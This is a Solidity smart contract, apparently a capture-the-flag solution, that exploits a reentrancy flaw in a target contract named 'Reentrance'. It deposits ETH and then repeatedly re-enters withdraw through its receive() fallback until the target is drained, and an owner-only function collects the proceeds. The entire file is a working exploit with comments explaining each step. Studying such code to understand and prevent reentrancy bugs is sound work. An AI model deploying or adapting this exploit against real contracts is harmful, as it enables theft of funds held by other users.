// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentranceExploit
 * @dev Contract to exploit the reentrancy vulnerability in the Reentrance contract
 * The attack works by repeatedly calling withdraw() before the balance is updated
 */
contract ReentranceExploit {
    address public owner;
    address public targetContract;
    uint256 public initialDeposit;
    bool public attacking = false;

    constructor(address _targetContract) {
        owner = msg.sender;
        targetContract = _targetContract;
    }

    /**
     * @dev Start the attack by depositing some ETH and then immediately withdrawing it
     */
    function attack() external payable {
        require(msg.sender == owner, "Only owner can call this function");
        require(msg.value > 0, "Need ETH to perform attack");
        initialDeposit = msg.value;

        // First, donate to ourselves to establish a balance
        (bool success, ) = targetContract.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "Donation failed");

        // Then, start the attack by withdrawing
        attacking = true;
        withdrawAll();
    }

    /**
     * @dev Withdraw all funds from the target contract
     */
    function withdrawAll() public {
        require(attacking || msg.sender == owner, "Not in attack mode");
        
        // Get our current balance in the target contract
        (bool success, bytes memory data) = targetContract.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success, "Balance check failed");
        uint256 targetBalance = abi.decode(data, (uint256));
        
        // If there's a balance, withdraw it
        if (targetBalance > 0) {
            // Calculate amount to withdraw - either our balance or the contract's entire balance
            (success, data) = targetContract.call(
                abi.encodeWithSignature("withdraw(uint256)", targetBalance)
            );
            require(success, "Withdrawal failed");
        }
    }
    
    /**
     * @dev This function is called when the target contract sends ETH back
     * If we're in attack mode, we recursively call withdraw again
     */
    receive() external payable {
        if (attacking && address(targetContract).balance >= initialDeposit) {
            withdrawAll();
        } else if (attacking) {
            // We've drained the contract, stop the attack
            attacking = false;
        }
    }
    
    /**
     * @dev Allow the owner to withdraw all ETH from this contract
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner can call this function");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Get the balance of the target contract
     */
    function getTargetBalance() external view returns (uint256) {
        return address(targetContract).balance;
    }
}
